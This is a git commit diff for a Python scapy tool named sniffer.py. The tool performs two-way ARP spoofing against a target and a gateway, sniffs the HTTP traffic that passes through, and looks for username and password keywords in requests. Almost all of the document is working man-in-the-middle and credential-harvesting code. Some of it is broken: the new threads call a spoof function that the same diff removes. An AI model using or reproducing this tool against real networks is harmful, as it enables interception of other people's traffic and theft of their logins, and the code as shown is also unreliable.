79bf2624be0961758c98c0989ee23268e536a762
Loan Dumenoir <loan.dumenoir@gmail.com>
2023-12-15 09:43:28 +0100

    Update

--- sniffer.py
+++ sniffer.py
@@ -3,7 +3,7 @@ import argparse, time, threading
 import scapy.all as scapy
 from scapy.layers import http
 
-global spoofed
+global spoofed_list, packet_sent, spoof_running
 
 def main():
     ecouteReseau()
@@ -11,35 +11,37 @@ def main():
 def ecouteReseau():
     scapy.sniff(iface=args.iface, filter=args.filter, count=args.count, prn=analysePaquet, store=args.save)
 
-def analysePaquet(paquet):
-    if paquet.haslayer(http.HTTPRequest) and paquet[http.HTTPRequest].haslayer(http.HTTPRequest):
-        extractUrl(paquet)
-        extractIds(paquet)
+def analysePaquet(packet):
+    if packet.haslayer(http.HTTPRequest) and packet[http.HTTPRequest].haslayer(http.HTTPRequest):
+        extractUrl(packet)
+        extractIds(packet)
 
-def extractUrl(paquet):
-    url = paquet[http.HTTPRequest].Host.decode() + paquet[http.HTTPRequest].Path.decode()
+def extractUrl(packet):
+    url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
     print(f"URL extracted: {url}", url)
 
 # You should change this list to something bigger
 keywords_to_search = ('username', 'uname', 'user', 'login', 'password', 'pass', 'signin', 'signup', 'name')
 
-def extractIds(paquet):
-    if paquet[http.HTTPRequest].haslayer(scapy.Raw):
-        body = paquet[http.HTTPRequest].Raw.load.decode(errors="ignore")
+def extractIds(packet):
+    if packet[http.HTTPRequest].haslayer(scapy.Raw):
+        body = packet[http.HTTPRequest].Raw.load.decode(errors="ignore")
         for keyword in keywords_to_search:
             if keyword in body:
                 print(f"Keyword '{keyword}' found in the request body.")
 
-    params = paquet[http.HTTPRequest].http_request
+    params = packet[http.HTTPRequest].http_request
     for keyword in keywords_to_search:
         if keyword in params:
             print(f"Keyword '{keyword}' found in the request parameters.")
     
-def arpSpoofing():
-    paquet_gtw_to_target = scapy.ARP(op=2, pdst=args.target, hwdst=getMac(args.target), psrc=args.mitm)
-    paquet_target_to_gtw = scapy.ARP(op=2, pdst=args.mitm, hwdst=getMac(args.mitm), psrc=args.target)
-    scapy.send(paquet_gtw_to_target, verbose=args.verbose)
-    scapy.send(paquet_target_to_gtw, verbose=args.verbose)
+def arpSpoofing(pdst, psrc):
+    while spoof_running:
+        packet = scapy.ARP(op=2, pdst=pdst, hwdst=getMac(pdst), psrc=psrc)
+        scapy.send(packet, verbose=args.verbose)
+        if args.verbose:
+            print(f"[*] Packets sent {packet_sent}")
+    cleanSpoof(pdst, psrc)
 
 def getMac(ip):
     arp_who_has = scapy.ARP(pdst = ip)
@@ -48,22 +50,12 @@ def getMac(ip):
     answered_list = scapy.srp(request, timeout=args.timeout, verbose=args.verbose)[0]
     return answered_list[0][1].hwsrc
 
-def cleanSpoof():
-    hwdst = getMac(args.target)
-    hwsrc = getMac(args.mitm)
-    paquet1 = scapy.ARP(op=2, pdst=args.target, psrc=args.mitm, hwdst=hwdst, hwsrc=hwsrc)
-    paquet2 = scapy.ARP(op=2, pdst=args.mitm, psrc=args.target, hwdst=hwsrc, hwsrc=hwdst)
-    scapy.send(paquet1, verbose=args.verbose)
-    scapy.send(paquet2, verbose=args.verbose)
+def cleanSpoof(pdst, psrc):
+    packet = scapy.ARP(op=2, pdst=pdst, psrc=psrc, hwdst=getMac(pdst), hwsrc=getMac(psrc))
+    scapy.send(packet, verbose=args.verbose)
+    if args.verbose:
+        print(f"[*] Packets sent {packet_sent}")
 
-
-def spoof():
-    try:
-        while True:
-            print("Spoofing...")
-            time.sleep(1)
-    except Exception as e:
-        print(f"Error in spoof: {e}")
 
 
 if __name__ == "__main__":
@@ -85,14 +77,20 @@ if __name__ == "__main__":
     args = parser.parse_args()
 
     if args.mitm:
-        spoof_thread = threading.Thread(target=spoof)
+        spoof_running = True
+        spoof_thread_target = threading.Thread(target=spoof, args=(args.target, args.mitm))
+        spoof_thread_gtw = threading.Thread(target=spoof, args=(args.mitm, args.target))
         try:
-            spoof_thread.start()
+            spoof_thread_target.start()
+            spoof_thread_gtw.start()
             main()
         except Exception as e:
             print(f"{e}")
-            spoof_thread.join()
+            print("Enter in the spoof target thread")
+            spoof_thread_target.join()
+            print("Enter in the spoof gateway thread")
+            spoof_thread_gtw.join()
         finally:
-            cleanSpoof()
+            print("Exit correctly")
 
     main()
